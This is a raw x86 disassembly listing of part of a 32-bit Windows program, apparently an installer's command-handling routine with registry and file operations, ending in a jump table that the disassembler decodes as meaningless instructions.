  4024f4:	57                   	push   %edi
  4024f5:	e8 21 3f 00 00       	call   0x40641b
  4024fa:	40                   	inc    %eax
  4024fb:	83 fe 04             	cmp    $0x4,%esi
  4024fe:	75 15                	jne    0x402515
  402500:	6a 03                	push   $0x3
  402502:	e8 3c 07 00 00       	call   0x402c43
  402507:	59                   	pop    %ecx
  402508:	a3 20 ac 40 00       	mov    %eax,0x40ac20
  40250d:	56                   	push   %esi
  40250e:	89 95 78 ff ff ff    	mov    %edx,-0x88(%ebp)
  402514:	58                   	pop    %eax
  402515:	83 fe 03             	cmp    $0x3,%esi
  402518:	75 0f                	jne    0x402529
  40251a:	68 00 0c 00 00       	push   $0xc00
  40251f:	57                   	push   %edi
  402520:	53                   	push   %ebx
  402521:	ff 75 e8             	push   -0x18(%ebp)
  402524:	e8 33 0d 00 00       	call   0x40325c
  402529:	50                   	push   %eax
  40252a:	57                   	push   %edi
  40252b:	ff 75 c8             	push   -0x38(%ebp)
  40252e:	53                   	push   %ebx
  40252f:	ff 75 88             	push   -0x78(%ebp)
  402532:	ff 75 08             	push   0x8(%ebp)
  402535:	ff 15 0c 80 40 00    	call   *0x40800c
  40253b:	85 c0                	test   %eax,%eax
  40253d:	75 03                	jne    0x402542
  40253f:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402542:	ff 75 08             	push   0x8(%ebp)
  402545:	e9 cf 00 00 00       	jmp    0x402619
  40254a:	68 19 00 02 00       	push   $0x20019
  40254f:	e8 51 07 00 00       	call   0x402ca5
  402554:	6a 33                	push   $0x33
  402556:	8b f8                	mov    %eax,%edi
  402558:	e8 08 07 00 00       	call   0x402c65
  40255d:	3b fb                	cmp    %ebx,%edi
  40255f:	88 1e                	mov    %bl,(%esi)
  402561:	0f 84 8d 02 00 00    	je     0x4027f4
  402567:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40256a:	c7 45 c8 00 04 00 00 	movl   $0x400,-0x38(%ebp)
  402571:	51                   	push   %ecx
  402572:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402575:	56                   	push   %esi
  402576:	51                   	push   %ecx
  402577:	53                   	push   %ebx
  402578:	50                   	push   %eax
  402579:	57                   	push   %edi
  40257a:	ff 15 08 80 40 00    	call   *0x408008
  402580:	33 c9                	xor    %ecx,%ecx
  402582:	41                   	inc    %ecx
  402583:	85 c0                	test   %eax,%eax
  402585:	75 2e                	jne    0x4025b5
  402587:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  40258b:	74 13                	je     0x4025a0
  40258d:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  402590:	74 06                	je     0x402598
  402592:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  402596:	75 1d                	jne    0x4025b5
  402598:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40259b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40259e:	eb 72                	jmp    0x402612
  4025a0:	ff 36                	push   (%esi)
  4025a2:	33 c0                	xor    %eax,%eax
  4025a4:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  4025a7:	56                   	push   %esi
  4025a8:	0f 94 c0             	sete   %al
  4025ab:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4025ae:	e8 b0 3d 00 00       	call   0x406363
  4025b3:	eb 63                	jmp    0x402618
  4025b5:	88 1e                	mov    %bl,(%esi)
  4025b7:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4025ba:	eb 5c                	jmp    0x402618
  4025bc:	68 19 00 02 00       	push   $0x20019
  4025c1:	e8 df 06 00 00       	call   0x402ca5
  4025c6:	6a 03                	push   $0x3
  4025c8:	8b f8                	mov    %eax,%edi
  4025ca:	e8 74 06 00 00       	call   0x402c43
  4025cf:	3b fb                	cmp    %ebx,%edi
  4025d1:	59                   	pop    %ecx
  4025d2:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4025d5:	88 1e                	mov    %bl,(%esi)
  4025d7:	0f 84 17 02 00 00    	je     0x4027f4
  4025dd:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  4025e0:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4025e5:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4025e8:	74 0c                	je     0x4025f6
  4025ea:	51                   	push   %ecx
  4025eb:	56                   	push   %esi
  4025ec:	50                   	push   %eax
  4025ed:	57                   	push   %edi
  4025ee:	ff 15 04 80 40 00    	call   *0x408004
  4025f4:	eb 1c                	jmp    0x402612
  4025f6:	53                   	push   %ebx
  4025f7:	53                   	push   %ebx
  4025f8:	53                   	push   %ebx
  4025f9:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4025fc:	53                   	push   %ebx
  4025fd:	51                   	push   %ecx
  4025fe:	56                   	push   %esi
  4025ff:	50                   	push   %eax
  402600:	57                   	push   %edi
  402601:	ff 15 00 80 40 00    	call   *0x408000
  402607:	85 c0                	test   %eax,%eax
  402609:	74 07                	je     0x402612
  40260b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402612:	88 9e ff 03 00 00    	mov    %bl,0x3ff(%esi)
  402618:	57                   	push   %edi
  402619:	ff 15 10 80 40 00    	call   *0x408010
  40261f:	e9 cd 04 00 00       	jmp    0x402af1
  402624:	56                   	push   %esi
  402625:	e8 52 3d 00 00       	call   0x40637c
  40262a:	3b c3                	cmp    %ebx,%eax
  40262c:	0f 84 bf 04 00 00    	je     0x402af1
  402632:	50                   	push   %eax
  402633:	e9 b4 f9 ff ff       	jmp    0x401fec
  402638:	6a ed                	push   $0xffffffed
  40263a:	e8 26 06 00 00       	call   0x402c65
  40263f:	ff 75 e4             	push   -0x1c(%ebp)
  402642:	ff 75 e0             	push   -0x20(%ebp)
  402645:	50                   	push   %eax
  402646:	e8 4d 39 00 00       	call   0x405f98
  40264b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40264e:	0f 84 9e 01 00 00    	je     0x4027f2
  402654:	50                   	push   %eax
  402655:	e9 34 ef ff ff       	jmp    0x40158e
  40265a:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  40265d:	74 14                	je     0x402673
  40265f:	33 ff                	xor    %edi,%edi
  402661:	47                   	inc    %edi
  402662:	57                   	push   %edi
  402663:	e8 db 05 00 00       	call   0x402c43
  402668:	59                   	pop    %ecx
  402669:	89 55 c8             	mov    %edx,-0x38(%ebp)
  40266c:	a2 20 a8 40 00       	mov    %al,0x40a820
  402671:	eb 0f                	jmp    0x402682
  402673:	6a 11                	push   $0x11
  402675:	e8 eb 05 00 00       	call   0x402c65
  40267a:	50                   	push   %eax
  40267b:	e8 9b 3d 00 00       	call   0x40641b
  402680:	8b f8                	mov    %eax,%edi
  402682:	38 1e                	cmp    %bl,(%esi)
  402684:	0f 84 6a 01 00 00    	je     0x4027f4
  40268a:	56                   	push   %esi
  40268b:	e8 ec 3c 00 00       	call   0x40637c
  402690:	57                   	push   %edi
  402691:	68 20 a8 40 00       	push   $0x40a820
  402696:	50                   	push   %eax
  402697:	e8 a3 39 00 00       	call   0x40603f
  40269c:	e9 32 ef ff ff       	jmp    0x4015d3
  4026a1:	6a 02                	push   $0x2
  4026a3:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4026a6:	e8 98 05 00 00       	call   0x402c43
  4026ab:	83 f8 01             	cmp    $0x1,%eax
  4026ae:	59                   	pop    %ecx
  4026af:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4026b2:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4026b5:	0f 8c 36 04 00 00    	jl     0x402af1
  4026bb:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4026c0:	3b c1                	cmp    %ecx,%eax
  4026c2:	7e 03                	jle    0x4026c7
  4026c4:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4026c7:	38 1e                	cmp    %bl,(%esi)
  4026c9:	0f 84 82 00 00 00    	je     0x402751
  4026cf:	56                   	push   %esi
  4026d0:	88 5d 0b             	mov    %bl,0xb(%ebp)
  4026d3:	e8 a4 3c 00 00       	call   0x40637c
  4026d8:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  4026db:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4026de:	7e 71                	jle    0x402751
  4026e0:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4026e3:	8d 45 d7             	lea    -0x29(%ebp),%eax
  4026e6:	6a 01                	push   $0x1
  4026e8:	50                   	push   %eax
  4026e9:	ff 75 d0             	push   -0x30(%ebp)
  4026ec:	e8 1f 39 00 00       	call   0x406010
  4026f1:	85 c0                	test   %eax,%eax
  4026f3:	74 5f                	je     0x402754
  4026f5:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4026f8:	75 21                	jne    0x40271b
  4026fa:	80 7d 0b 0d          	cmpb   $0xd,0xb(%ebp)
  4026fe:	74 2b                	je     0x40272b
  402700:	80 7d 0b 0a          	cmpb   $0xa,0xb(%ebp)
  402704:	74 25                	je     0x40272b
  402706:	8a 45 d7             	mov    -0x29(%ebp),%al
  402709:	88 04 3e             	mov    %al,(%esi,%edi,1)
  40270c:	46                   	inc    %esi
  40270d:	3a c3                	cmp    %bl,%al
  40270f:	88 45 0b             	mov    %al,0xb(%ebp)
  402712:	74 40                	je     0x402754
  402714:	3b 75 f4             	cmp    -0xc(%ebp),%esi
  402717:	7c ca                	jl     0x4026e3
  402719:	eb 39                	jmp    0x402754
  40271b:	0f b6 45 d7          	movzbl -0x29(%ebp),%eax
  40271f:	50                   	push   %eax
  402720:	57                   	push   %edi
  402721:	e8 3d 3c 00 00       	call   0x406363
  402726:	e9 cf 03 00 00       	jmp    0x402afa
  40272b:	8a 45 d7             	mov    -0x29(%ebp),%al
  40272e:	38 45 0b             	cmp    %al,0xb(%ebp)
  402731:	74 0e                	je     0x402741
  402733:	3c 0d                	cmp    $0xd,%al
  402735:	74 04                	je     0x40273b
  402737:	3c 0a                	cmp    $0xa,%al
  402739:	75 06                	jne    0x402741
  40273b:	88 04 3e             	mov    %al,(%esi,%edi,1)
  40273e:	46                   	inc    %esi
  40273f:	eb 13                	jmp    0x402754
  402741:	6a 01                	push   $0x1
  402743:	53                   	push   %ebx
  402744:	6a ff                	push   $0xffffffff
  402746:	ff 75 d0             	push   -0x30(%ebp)
  402749:	ff 15 28 81 40 00    	call   *0x408128
  40274f:	eb 03                	jmp    0x402754
  402751:	8b 75 f8             	mov    -0x8(%ebp),%esi
  402754:	88 1c 3e             	mov    %bl,(%esi,%edi,1)
  402757:	3b f3                	cmp    %ebx,%esi
  402759:	e9 77 ee ff ff       	jmp    0x4015d5
  40275e:	38 1e                	cmp    %bl,(%esi)
  402760:	0f 84 8b 03 00 00    	je     0x402af1
  402766:	6a 02                	push   $0x2
  402768:	e8 d6 04 00 00       	call   0x402c43
  40276d:	59                   	pop    %ecx
  40276e:	89 55 c8             	mov    %edx,-0x38(%ebp)
  402771:	ff 75 e8             	push   -0x18(%ebp)
  402774:	53                   	push   %ebx
  402775:	50                   	push   %eax
  402776:	56                   	push   %esi
  402777:	e8 00 3c 00 00       	call   0x40637c
  40277c:	50                   	push   %eax
  40277d:	ff 15 28 81 40 00    	call   *0x408128
  402783:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402786:	0f 8c 65 03 00 00    	jl     0x402af1
  40278c:	50                   	push   %eax
  40278d:	e9 db 02 00 00       	jmp    0x402a6d
  402792:	56                   	push   %esi
  402793:	e8 e4 3b 00 00       	call   0x40637c
  402798:	3b c3                	cmp    %ebx,%eax
  40279a:	0f 84 51 03 00 00    	je     0x402af1
  4027a0:	50                   	push   %eax
  4027a1:	ff 15 2c 81 40 00    	call   *0x40812c
  4027a7:	e9 45 03 00 00       	jmp    0x402af1
  4027ac:	57                   	push   %edi
  4027ad:	e8 ca 3b 00 00       	call   0x40637c
  4027b2:	3b c3                	cmp    %ebx,%eax
  4027b4:	74 12                	je     0x4027c8
  4027b6:	8d 8d 30 fe ff ff    	lea    -0x1d0(%ebp),%ecx
  4027bc:	51                   	push   %ecx
  4027bd:	50                   	push   %eax
  4027be:	ff 15 30 81 40 00    	call   *0x408130
  4027c4:	85 c0                	test   %eax,%eax
  4027c6:	75 3f                	jne    0x402807
  4027c8:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4027cf:	88 1e                	mov    %bl,(%esi)
  4027d1:	e9 1b 03 00 00       	jmp    0x402af1
  4027d6:	6a 02                	push   $0x2
  4027d8:	e8 88 04 00 00       	call   0x402c65
  4027dd:	8d 8d 30 fe ff ff    	lea    -0x1d0(%ebp),%ecx
  4027e3:	51                   	push   %ecx
  4027e4:	50                   	push   %eax
  4027e5:	ff 15 34 81 40 00    	call   *0x408134
  4027eb:	83 f8 ff             	cmp    $0xffffffff,%eax
  4027ee:	75 10                	jne    0x402800
  4027f0:	88 1f                	mov    %bl,(%edi)
  4027f2:	88 1e                	mov    %bl,(%esi)
  4027f4:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4027fb:	e9 f1 02 00 00       	jmp    0x402af1
  402800:	50                   	push   %eax
  402801:	57                   	push   %edi
  402802:	e8 5c 3b 00 00       	call   0x406363
  402807:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  40280d:	50                   	push   %eax
  40280e:	56                   	push   %esi
  40280f:	e9 49 01 00 00       	jmp    0x40295d
  402814:	6a f0                	push   $0xfffffff0
  402816:	bf 66 fd ff ff       	mov    $0xfffffd66,%edi
  40281b:	e8 45 04 00 00       	call   0x402c65
  402820:	8b f0                	mov    %eax,%esi
  402822:	56                   	push   %esi
  402823:	89 75 88             	mov    %esi,-0x78(%ebp)
  402826:	e8 d9 35 00 00       	call   0x405e04
  40282b:	85 c0                	test   %eax,%eax
  40282d:	75 07                	jne    0x402836
  40282f:	6a ed                	push   $0xffffffed
  402831:	e8 2f 04 00 00       	call   0x402c65
  402836:	56                   	push   %esi
  402837:	e8 37 37 00 00       	call   0x405f73
  40283c:	6a 02                	push   $0x2
  40283e:	68 00 00 00 40       	push   $0x40000000
  402843:	56                   	push   %esi
  402844:	e8 4f 37 00 00       	call   0x405f98
  402849:	83 f8 ff             	cmp    $0xffffffff,%eax
  40284c:	89 45 08             	mov    %eax,0x8(%ebp)
  40284f:	0f 84 b0 00 00 00    	je     0x402905
  402855:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402858:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  40285b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40285e:	0f 84 89 00 00 00    	je     0x4028ed
  402864:	a1 74 43 42 00       	mov    0x424374,%eax
  402869:	8b 35 0c 81 40 00    	mov    0x40810c,%esi
  40286f:	50                   	push   %eax
  402870:	6a 40                	push   $0x40
  402872:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402875:	ff d6                	call   *%esi
  402877:	8b f8                	mov    %eax,%edi
  402879:	3b fb                	cmp    %ebx,%edi
  40287b:	74 70                	je     0x4028ed
  40287d:	53                   	push   %ebx
  40287e:	e8 60 0c 00 00       	call   0x4034e3
  402883:	ff 75 d0             	push   -0x30(%ebp)
  402886:	57                   	push   %edi
  402887:	e8 41 0c 00 00       	call   0x4034cd
  40288c:	ff 75 e4             	push   -0x1c(%ebp)
  40288f:	6a 40                	push   $0x40
  402891:	ff d6                	call   *%esi
  402893:	8b f0                	mov    %eax,%esi
  402895:	3b f3                	cmp    %ebx,%esi
  402897:	89 75 c8             	mov    %esi,-0x38(%ebp)
  40289a:	74 3a                	je     0x4028d6
  40289c:	ff 75 e4             	push   -0x1c(%ebp)
  40289f:	56                   	push   %esi
  4028a0:	53                   	push   %ebx
  4028a1:	ff 75 e0             	push   -0x20(%ebp)
  4028a4:	e8 b3 09 00 00       	call   0x40325c
  4028a9:	eb 1e                	jmp    0x4028c9
  4028ab:	8b 0e                	mov    (%esi),%ecx
  4028ad:	8b 46 04             	mov    0x4(%esi),%eax
  4028b0:	83 c6 08             	add    $0x8,%esi
  4028b3:	51                   	push   %ecx
  4028b4:	03 c7                	add    %edi,%eax
  4028b6:	56                   	push   %esi
  4028b7:	50                   	push   %eax
  4028b8:	89 8d 74 ff ff ff    	mov    %ecx,-0x8c(%ebp)
  4028be:	e8 90 36 00 00       	call   0x405f53
  4028c3:	03 b5 74 ff ff ff    	add    -0x8c(%ebp),%esi
  4028c9:	38 1e                	cmp    %bl,(%esi)
  4028cb:	75 de                	jne    0x4028ab
  4028cd:	ff 75 c8             	push   -0x38(%ebp)
  4028d0:	ff 15 08 81 40 00    	call   *0x408108
  4028d6:	ff 75 d0             	push   -0x30(%ebp)
  4028d9:	57                   	push   %edi
  4028da:	ff 75 08             	push   0x8(%ebp)
  4028dd:	e8 5d 37 00 00       	call   0x40603f
  4028e2:	57                   	push   %edi
  4028e3:	ff 15 08 81 40 00    	call   *0x408108
  4028e9:	83 4d f4 ff          	orl    $0xffffffff,-0xc(%ebp)
  4028ed:	53                   	push   %ebx
  4028ee:	53                   	push   %ebx
  4028ef:	ff 75 08             	push   0x8(%ebp)
  4028f2:	ff 75 f4             	push   -0xc(%ebp)
  4028f5:	e8 62 09 00 00       	call   0x40325c
  4028fa:	ff 75 08             	push   0x8(%ebp)
  4028fd:	8b f8                	mov    %eax,%edi
  4028ff:	ff 15 f8 80 40 00    	call   *0x4080f8
  402905:	6a f3                	push   $0xfffffff3
  402907:	3b fb                	cmp    %ebx,%edi
  402909:	5e                   	pop    %esi
  40290a:	7d 13                	jge    0x40291f
  40290c:	6a ef                	push   $0xffffffef
  40290e:	5e                   	pop    %esi
  40290f:	ff 75 88             	push   -0x78(%ebp)
  402912:	ff 15 38 81 40 00    	call   *0x408138
  402918:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40291f:	56                   	push   %esi
  402920:	e9 ec f9 ff ff       	jmp    0x402311
  402925:	53                   	push   %ebx
  402926:	e8 18 03 00 00       	call   0x402c43
  40292b:	3b 05 8c 43 42 00    	cmp    0x42438c,%eax
  402931:	59                   	pop    %ecx
  402932:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  402935:	89 55 c8             	mov    %edx,-0x38(%ebp)
  402938:	0f 83 b6 fe ff ff    	jae    0x4027f4
  40293e:	8b f0                	mov    %eax,%esi
  402940:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402943:	69 f6 18 04 00 00    	imul   $0x418,%esi,%esi
  402949:	03 35 88 43 42 00    	add    0x424388,%esi
  40294f:	3b c3                	cmp    %ebx,%eax
  402951:	7c 1a                	jl     0x40296d
  402953:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  402956:	75 0f                	jne    0x402967
  402958:	83 c6 18             	add    $0x18,%esi
  40295b:	56                   	push   %esi
  40295c:	57                   	push   %edi
  40295d:	e8 a3 3a 00 00       	call   0x406405
  402962:	e9 8a 01 00 00       	jmp    0x402af1
  402967:	51                   	push   %ecx
  402968:	e9 00 01 00 00       	jmp    0x402a6d
  40296d:	83 c9 ff             	or     $0xffffffff,%ecx
  402970:	2b c8                	sub    %eax,%ecx
  402972:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  402975:	74 10                	je     0x402987
  402977:	6a 01                	push   $0x1
  402979:	e8 c5 02 00 00       	call   0x402c43
  40297e:	59                   	pop    %ecx
  40297f:	89 55 88             	mov    %edx,-0x78(%ebp)
  402982:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402985:	eb 10                	jmp    0x402997
  402987:	ff 75 ec             	push   -0x14(%ebp)
  40298a:	8d 46 18             	lea    0x18(%esi),%eax
  40298d:	50                   	push   %eax
  40298e:	e8 05 3b 00 00       	call   0x406498
  402993:	80 4e 09 01          	orb    $0x1,0x9(%esi)
  402997:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40299a:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40299d:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  4029a0:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4029a3:	0f 84 48 01 00 00    	je     0x402af1
  4029a9:	ff 75 c4             	push   -0x3c(%ebp)
  4029ac:	e8 cc e7 ff ff       	call   0x40117d
  4029b1:	e9 3b 01 00 00       	jmp    0x402af1
  4029b6:	53                   	push   %ebx
  4029b7:	e8 87 02 00 00       	call   0x402c43
  4029bc:	83 f8 20             	cmp    $0x20,%eax
  4029bf:	59                   	pop    %ecx
  4029c0:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4029c3:	0f 83 2b fe ff ff    	jae    0x4027f4
  4029c9:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4029cc:	74 22                	je     0x4029f0
  4029ce:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4029d1:	74 12                	je     0x4029e5
  4029d3:	50                   	push   %eax
  4029d4:	e8 c0 e8 ff ff       	call   0x401299
  4029d9:	53                   	push   %ebx
  4029da:	53                   	push   %ebx
  4029db:	e8 0f e8 ff ff       	call   0x4011ef
  4029e0:	e9 0c 01 00 00       	jmp    0x402af1
  4029e5:	53                   	push   %ebx
  4029e6:	e8 f7 e8 ff ff       	call   0x4012e2
  4029eb:	e9 9c fd ff ff       	jmp    0x40278c
  4029f0:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4029f3:	74 15                	je     0x402a0a
  4029f5:	8b 15 70 43 42 00    	mov    0x424370,%edx
  4029fb:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4029fe:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  402a05:	e9 e7 00 00 00       	jmp    0x402af1
  402a0a:	8b 0d 70 43 42 00    	mov    0x424370,%ecx
  402a10:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  402a17:	57                   	push   %edi
  402a18:	e8 7b 3a 00 00       	call   0x406498
  402a1d:	e9 cf 00 00 00       	jmp    0x402af1
  402a22:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402a25:	2b c3                	sub    %ebx,%eax
  402a27:	74 4c                	je     0x402a75
  402a29:	48                   	dec    %eax
  402a2a:	0f 85 c1 00 00 00    	jne    0x402af1
  402a30:	6a 02                	push   $0x2
  402a32:	e8 0c 02 00 00       	call   0x402c43
  402a37:	8b f0                	mov    %eax,%esi
  402a39:	6a 04                	push   $0x4
  402a3b:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  402a3e:	89 55 c8             	mov    %edx,-0x38(%ebp)
  402a41:	e8 fd 01 00 00       	call   0x402c43
  402a46:	59                   	pop    %ecx
  402a47:	89 55 88             	mov    %edx,-0x78(%ebp)
  402a4a:	59                   	pop    %ecx
  402a4b:	89 5d 08             	mov    %ebx,0x8(%ebp)
  402a4e:	0f b6 c8             	movzbl %al,%ecx
  402a51:	c1 e8 18             	shr    $0x18,%eax
  402a54:	3b f3                	cmp    %ebx,%esi
  402a56:	75 05                	jne    0x402a5d
  402a58:	be e0 43 42 00       	mov    $0x4243e0,%esi
  402a5d:	03 c6                	add    %esi,%eax
  402a5f:	51                   	push   %ecx
  402a60:	50                   	push   %eax
  402a61:	8d 45 08             	lea    0x8(%ebp),%eax
  402a64:	50                   	push   %eax
  402a65:	e8 e9 34 00 00       	call   0x405f53
  402a6a:	ff 75 08             	push   0x8(%ebp)
  402a6d:	57                   	push   %edi
  402a6e:	e8 f0 38 00 00       	call   0x406363
  402a73:	eb 7c                	jmp    0x402af1
  402a75:	6a 05                	push   $0x5
  402a77:	e8 b1 3d 00 00       	call   0x40682d
  402a7c:	6a 22                	push   $0x22
  402a7e:	8b f0                	mov    %eax,%esi
  402a80:	e8 e0 01 00 00       	call   0x402c65
  402a85:	3b f3                	cmp    %ebx,%esi
  402a87:	74 38                	je     0x402ac1
  402a89:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  402a8c:	51                   	push   %ecx
  402a8d:	50                   	push   %eax
  402a8e:	e8 c5 39 00 00       	call   0x406458
  402a93:	59                   	pop    %ecx
  402a94:	85 c0                	test   %eax,%eax
  402a96:	59                   	pop    %ecx
  402a97:	7c 28                	jl     0x402ac1
  402a99:	8d 45 08             	lea    0x8(%ebp),%eax
  402a9c:	50                   	push   %eax
  402a9d:	53                   	push   %ebx
  402a9e:	ff 75 e8             	push   -0x18(%ebp)
  402aa1:	8d 45 bc             	lea    -0x44(%ebp),%eax
  402aa4:	50                   	push   %eax
  402aa5:	ff d6                	call   *%esi
  402aa7:	85 c0                	test   %eax,%eax
  402aa9:	7c 16                	jl     0x402ac1
  402aab:	ff 75 08             	push   0x8(%ebp)
  402aae:	57                   	push   %edi
  402aaf:	e8 8e 39 00 00       	call   0x406442
  402ab4:	59                   	pop    %ecx
  402ab5:	59                   	pop    %ecx
  402ab6:	ff 75 08             	push   0x8(%ebp)
  402ab9:	ff 15 8c 82 40 00    	call   *0x40828c
  402abf:	eb 30                	jmp    0x402af1
  402ac1:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402ac8:	88 1f                	mov    %bl,(%edi)
  402aca:	eb 25                	jmp    0x402af1
  402acc:	8b 0d 58 19 42 00    	mov    0x421958,%ecx
  402ad2:	53                   	push   %ebx
  402ad3:	23 c8                	and    %eax,%ecx
  402ad5:	51                   	push   %ecx
  402ad6:	6a 0b                	push   $0xb
  402ad8:	ff 75 f8             	push   -0x8(%ebp)
  402adb:	ff 15 44 82 40 00    	call   *0x408244
  402ae1:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402ae4:	74 0b                	je     0x402af1
  402ae6:	53                   	push   %ebx
  402ae7:	53                   	push   %ebx
  402ae8:	ff 75 f8             	push   -0x8(%ebp)
  402aeb:	ff 15 40 82 40 00    	call   *0x408240
  402af1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402af4:	01 05 e8 43 42 00    	add    %eax,0x4243e8
  402afa:	33 c0                	xor    %eax,%eax
  402afc:	5f                   	pop    %edi
  402afd:	5e                   	pop    %esi
  402afe:	5b                   	pop    %ebx
  402aff:	c9                   	leave
  402b00:	c2 04 00             	ret    $0x4
  402b03:	fc                   	cld
  402b04:	2a 40 00             	sub    0x0(%eax),%al
  402b07:	90                   	nop
  402b08:	14 40                	adc    $0x40,%al
  402b0a:	00 9c 14 40 00 b7 14 	add    %bl,0x14b70040(%esp,%edx,1)
  402b11:	40                   	inc    %eax
  402b12:	00 ca                	add    %cl,%dl
  402b14:	14 40                	adc    $0x40,%al
  402b16:	00 d6                	add    %dl,%dh
  402b18:	14 40                	adc    $0x40,%al
  402b1a:	00 f4                	add    %dh,%ah
  402b1c:	14 40                	adc    $0x40,%al
  402b1e:	00 94 15 40 00 c2 15 	add    %dl,0x15c20040(%ebp,%edx,1)
  402b25:	40                   	inc    %eax
  402b26:	00 e0                	add    %ah,%al
  402b28:	15 40 00 85 16       	adc    $0x16850040,%eax
  402b2d:	40                   	inc    %eax
  402b2e:	00 02                	add    %al,(%edx)
  402b30:	15 40 00 66 15       	adc    $0x15660040,%eax
  402b35:	40                   	inc    %eax
  402b36:	00 87 15 40 00 96    	add    %al,-0x69ffbfeb(%edi)
  402b3c:	16                   	push   %ss
  402b3d:	40                   	inc    %eax
  402b3e:	00 e7                	add    %ah,%bh
  402b40:	16                   	push   %ss
  402b41:	40                   	inc    %eax
  402b42:	00 4b 17             	add    %cl,0x17(%ebx)
  402b45:	40                   	inc    %eax
  402b46:	00 72 17             	add    %dh,0x17(%edx)
  402b49:	40                   	inc    %eax
  402b4a:	00 85 17 40 00 29    	add    %al,0x29004017(%ebp)
  402b50:	19 40 00             	sbb    %eax,0x0(%eax)
  402b53:	2c 19                	sub    $0x19,%al
  402b55:	40                   	inc    %eax
  402b56:	00 5e 19             	add    %bl,0x19(%esi)
  402b59:	40                   	inc    %eax
  402b5a:	00 73 19             	add    %dh,0x19(%ebx)
  402b5d:	40                   	inc    %eax
  402b5e:	00 85 19 40 00 19    	add    %al,0x19004019(%ebp)
  402b64:	1a 40 00             	sbb    0x0(%eax),%al
  402b67:	4a                   	dec    %edx
  402b68:	1a 40 00             	sbb    0x0(%eax),%al
  402b6b:	8a 1a                	mov    (%edx),%bl
  402b6d:	40                   	inc    %eax
  402b6e:	00 ca                	add    %cl,%dl
  402b70:	1a 40 00             	sbb    0x0(%eax),%al
  402b73:	8f                   	(bad)
  402b74:	1b 40 00             	sbb    0x0(%eax),%eax
  402b77:	b3 1b                	mov    $0x1b,%bl
  402b79:	40                   	inc    %eax
  402b7a:	00 5a 1c             	add    %bl,0x1c(%edx)
  402b7d:	40                   	inc    %eax
  402b7e:	00 5a 1c             	add    %bl,0x1c(%edx)
  402b81:	40                   	inc    %eax
  402b82:	00 2a                	add    %ch,(%edx)
  402b84:	1d 40 00 4b 1d       	sbb    $0x1d4b0040,%eax
  402b89:	40                   	inc    %eax
  402b8a:	00 70 1d             	add    %dh,0x1d(%eax)
  402b8d:	40                   	inc    %eax
  402b8e:	00 91 1d 40 00 61    	add    %dl,0x6100401d(%ecx)
  402b94:	1e                   	push   %ds
  402b95:	40                   	inc    %eax
  402b96:	00 f1                	add    %dh,%cl
  402b98:	1e                   	push   %ds
  402b99:	40                   	inc    %eax
  402b9a:	00 25 1f 40 00 a7    	add    %ah,0xa700401f
  402ba0:	1f                   	pop    %ds
  402ba1:	40                   	inc    %eax
  402ba2:	00 f7                	add    %dh,%bh
  402ba4:	1f                   	pop    %ds
  402ba5:	40                   	inc    %eax
  402ba6:	00 27                	add    %ah,(%edi)
  402ba8:	20 40 00             	and    %al,0x0(%eax)
  402bab:	d0 20                	shlb   $1,(%eax)
  402bad:	40                   	inc    %eax
  402bae:	00 9f 21 40 00 1f    	add    %bl,0x1f004021(%edi)
  402bb4:	23 40 00             	and    0x0(%eax),%eax
  402bb7:	a1 23 40 00 d0       	mov    0xd0004023,%eax
